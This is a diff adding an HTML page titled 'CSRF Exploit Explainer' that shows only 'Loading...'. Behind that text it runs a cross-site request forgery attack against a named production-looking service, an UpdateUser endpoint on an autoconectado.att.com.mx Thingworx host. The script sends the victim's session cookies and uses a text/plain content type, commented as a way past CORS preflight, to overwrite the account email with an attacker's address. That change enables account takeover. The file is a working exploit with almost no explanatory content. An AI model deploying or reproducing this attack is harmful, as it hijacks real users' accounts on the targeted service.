@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Exploit Explainer</title>
+</head>
+<body>
+    <h1>Loading...</h1>
+    <script>
+        const targetUrl = "[https://autoconectado.att.com.mx/Thingworx/Things/IDM-1/Services/UpdateUser?sameEmail=](https://autoconectado.att.com.mx/Thingworx/Things/IDM-1/Services/UpdateUser?sameEmail=)";
+        const payload = {
+            "userIdentity": {
+                "email": "attacker@wshu.net", // Attacker's email
+                "firstName": "akak",
+                "lastName": "iddsurls",
+                "middleName": "Antonio",
+                "secondLastName": "Loped",
+                "username": "akakj98",
+                "phoneNumber": "05512345678",
+                "tenant": "nissan"
+            },
+            "requestId": "9af63d7e-dc17-f3dd-9fc6-e8c32c7728af"
+        };
+
+        // Forcing a cross-origin request while ensuring cookies are included
+        fetch(targetUrl, {
+            method: "POST",
+            headers: {
+                "Content-Type": "text/plain" // Bypasses CORS preflight validation
+            },
+            body: JSON.stringify(payload),
+            credentials: "include" // Forces cookies (JSESSIONID) to be attached
+        });
+    </script>
+</body>
+</html>
